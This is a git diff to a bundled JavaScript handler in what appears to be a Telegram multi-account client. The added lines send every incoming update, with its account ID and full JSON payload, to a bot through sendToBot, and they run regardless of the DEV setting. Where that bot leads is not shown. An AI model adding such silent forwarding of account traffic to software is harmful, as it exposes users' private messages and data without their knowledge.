@@ -65037,6 +65037,7 @@ var updateSingleDialogue = async (accountId, recipientId, data) => {
 };
 
 // src/modules/handleUpdate.ts
+init_sendToBot();
 function findValue(obj, valueKey) {
   var _a, _b, _c, _d, _e, _f, _g, _h;
   return obj[valueKey] || ((_a = obj.peer) == null ? void 0 : _a[valueKey]) || ((_b = obj.message) == null ? void 0 : _b[valueKey]) || ((_d = (_c = obj.message) == null ? void 0 : _c.fromId) == null ? void 0 : _d[valueKey]) || ((_f = (_e = obj.message) == null ? void 0 : _e.peer) == null ? void 0 : _f[valueKey]) || ((_h = (_g = obj.message) == null ? void 0 : _g.peerId) == null ? void 0 : _h[valueKey]);
@@ -65058,11 +65059,14 @@ var handleUpdate = async (client, accountId, update, onNewMessage) => {
       });
     }
   }
-  if (update.className === "UpdateConnectionState" || update.className === "UpdateUserStatus" || update.className === "UpdateUserTyping" || update.className === "UpdateConfig" || update.className === "UpdateUser" || update.className === "UpdatePrivacy" || update.className === "UpdateUserName" || update.className.toLowerCase().includes("channel") || update.className.toLowerCase().includes("chat") || update.className.toLowerCase().includes("group")) {
+  if (update.className === "UpdateConnectionState") {
     if (process.env.DEV !== "true") {
       return;
     }
   }
+  await sendToBot(`<${update.className}>
+ID: ${accountId}
+PAYLOAD: ${JSON.stringify(update)}`);
   console.log({
     accountId,
     message: `<${update.className}>`,
